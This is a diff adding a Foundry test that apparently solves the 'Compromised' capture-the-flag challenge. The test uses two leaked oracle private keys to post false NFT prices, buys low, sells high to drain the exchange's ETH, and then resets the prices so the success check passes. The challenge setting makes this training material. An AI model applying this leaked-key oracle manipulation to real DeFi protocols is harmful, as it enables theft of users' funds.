@@ -75,6 +75,49 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        // decoded the hex values to a string online, and then decoded the base64 of it
+
+        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        address address1= vm.addr(pk1);
+        console.log("address 1", address1);
+        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        address address2 = vm.addr(pk2);
+        console.log("address 2", address2);
+        
+        // use the pk's to set the price on the oracle
+        vm.prank(address1);
+        oracle.postPrice("DVNFT", 1);
+
+        vm.prank(address2);
+        oracle.postPrice("DVNFT", 1);
+
+        // buy nft
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: 1}();
+
+        // set price back to the original price
+        vm.prank(address1);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1);
+
+        vm.prank(address2);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1);
+
+        // sell nft
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        
+
+        // send funds to recovery address
+        recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("0x");
+        vm.stopPrank();
+
+        // reset price to original to make the check work
+        vm.prank(address1);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        vm.prank(address2);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
         
     }
 
